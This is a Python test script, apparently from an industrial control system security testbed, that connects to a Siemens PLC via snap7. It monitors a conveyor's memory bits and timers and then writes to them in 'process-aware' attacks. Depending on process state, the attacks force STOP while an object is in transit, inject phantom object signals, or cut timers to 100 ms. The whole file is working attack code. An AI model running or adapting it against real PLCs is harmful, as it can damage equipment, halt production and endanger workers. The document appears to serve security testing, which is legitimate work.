"""
tests/test_logic_aware_attack.py
Process-aware Attack: Doc trang thai PLC -> phan tich -> quyet dinh tan cong.
Biet logic bang truyen: chi STOP khi co vat dang di qua (CD timer dang chay).

Chay: python tests/test_logic_aware_attack.py
"""

import sys
import os
import time
import struct

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from tests.common import *

MONITOR_DURATION = 20    # thoi gian doc trang thai de hieu logic
ATTACK_COUNT = 5          # so lan tan cong thong minh


def read_conveyor_state(client):
    """Doc toan bo trang thai bang truyen."""
    try:
        from snap7.type import Areas
    except ImportError:
        from snap7.types import Areas
    from snap7.util import get_bool, get_dint

    m5 = client.read_area(Areas.MK, 0, 5, 2)     # M5-M6
    cd1 = get_dint(client.read_area(Areas.MK, 0, 54, 4), 0)
    cd2 = get_dint(client.read_area(Areas.MK, 0, 58, 4), 0)
    cd3 = get_dint(client.read_area(Areas.MK, 0, 62, 4), 0)

    return {
        "START":  get_bool(m5, 0, 0),
        "STOP":   get_bool(m5, 0, 1),
        "Vat_1":  get_bool(m5, 0, 4),
        "Vat_2":  get_bool(m5, 0, 6),
        "Vat_3":  get_bool(m5, 1, 0),
        "S1":     get_bool(m5, 1, 1),
        "CD1":    cd1,
        "CD2":    cd2,
        "CD3":    cd3,
    }


def decide_attack(state):
    """
    Logic-aware decision:
    - Neu CD1 dang chay (co vat dang di) -> STOP ngay (collision/jam)
    - Neu Vat_1 dang active -> flip Vat_2 de tao nhieu vat ao
    - Neu CD timer > 3000ms -> rut ngan xuong 100ms (shock)
    """
    attacks = []

    if state["CD1"] > 0 and state["CD1"] < 30000:
        attacks.append(("STOP_DURING_TRANSPORT", "CD1={}ms -> STOP".format(state["CD1"])))

    if state["Vat_1"] and not state["STOP"]:
        attacks.append(("INJECT_PHANTOM_OBJECT", "Vat_1=1 -> flip Vat_2"))

    if state["CD2"] > 3000:
        attacks.append(("TIMER_SHOCK", "CD2={}ms -> 100ms".format(state["CD2"])))

    return attacks


def execute_attack(client, attack_name):
    try:
        from snap7.type import Areas
    except ImportError:
        from snap7.types import Areas
    from snap7.util import set_bool, set_dint

    if attack_name.startswith("STOP"):
        m5 = client.read_area(Areas.MK, 0, 5, 1)
        set_bool(m5, 0, 1, True)   # STOP=1
        set_bool(m5, 0, 0, False)  # START=0
        client.write_area(Areas.MK, 0, 5, m5)
        return "STOP set, START clear"

    elif attack_name.startswith("INJECT"):
        m5 = client.read_area(Areas.MK, 0, 5, 1)
        old = get_bool(m5, 0, 6) if 'from snap7.util import get_bool' else None
        set_bool(m5, 0, 6, True)   # Vat_2=1 (ao)
        client.write_area(Areas.MK, 0, 5, m5)
        return "Vat_2 set to 1 (phantom)"

    elif attack_name.startswith("TIMER"):
        buf = bytearray(4)
        set_dint(buf, 0, 100)      # 100ms shock
        client.write_area(Areas.MK, 0, 58, buf)  # CD2
        return "CD2 set to 100ms"

    return "executed"


def main():
    print(f"\n{B}[TEST] LOGIC_AWARE_ATTACK (Process-Aware){X}")
    info(f"PLC: {PLC_IP}")
    info(f"Monitor {MONITOR_DURATION}s -> analyze state -> attack smart")

    changes = []
    observable = []
    notes = []
    error = None
    t0 = time.time()

    try:
        import snap7
        from snap7.util import get_bool, set_bool, get_dint, set_dint
        from snap7.type import Areas

        c = snap7.client.Client()
        c.connect(PLC_IP, RACK, SLOT)
        ok("Connected to PLC")

        # Phase 1: Monitor + learn
        info(f"Phase 1: Learning PLC behavior ({MONITOR_DURATION}s)...")
        state_history = []
        for i in range(MONITOR_DURATION):
            state = read_conveyor_state(c)
            state_history.append(state)
            if i % 5 == 0:
                info(f"  [{i}s] START={state['START']} STOP={state['STOP']} "
                     f"Vat={state['Vat_1']}{state['Vat_2']}{state['Vat_3']} "
                     f"CD={state['CD1']}/{state['CD2']}/{state['CD3']}")
            time.sleep(1)

        # Phase 2: Analyze + decide
        info("Phase 2: Analyzing state...")
        # Lay state cuoi cung de quyet dinh
        current = state_history[-1]
        transitions = {}
        for k in ["START", "STOP", "Vat_1", "Vat_2", "Vat_3"]:
            vals = [s[k] for s in state_history]
            transitions[k] = sum(1 for i in range(1, len(vals)) if vals[i] != vals[i-1])

        info(f"  State transitions: {transitions}")
        info(f"  CD range: {min(s['CD1'] for s in state_history)}-{max(s['CD1'] for s in state_history)}")

        # Phase 3: Intelligent attack
        info(f"Phase 3: Logic-aware attacks (×{ATTACK_COUNT})...")
        for i in range(ATTACK_COUNT):
            state = read_conveyor_state(c)
            attacks = decide_attack(state)
            if attacks:
                attack_name, reason = attacks[0]
                result = execute_attack(c, attack_name)
                ok(f"  #{i+1}: {attack_name} ({reason}) -> {result}")
                observable.append(f"Logic-aware: {attack_name} at CD1={state['CD1']}ms")
            else:
                info(f"  #{i+1}: No optimal attack window — waiting...")
            time.sleep(3)

        notes.append(f"Monitored {MONITOR_DURATION}s, {len(state_history)} state snapshots")
        notes.append(f"Transitions: {transitions}")
        notes.append("Key: attack based on PROCESS STATE, not random")
        notes.append("STOP sent ONLY when CD timer active (collision window)")
        notes.append("Vat_2 injected when Vat_1 active (phantom object)")

        c.disconnect()

    except Exception as e:
        error = str(e)
        fail(str(e))

    success = len(observable) > 0
    print_result("LOGIC_AWARE_ATTACK", success, changes, observable, notes, time.time() - t0, error)


if __name__ == "__main__":
    main()
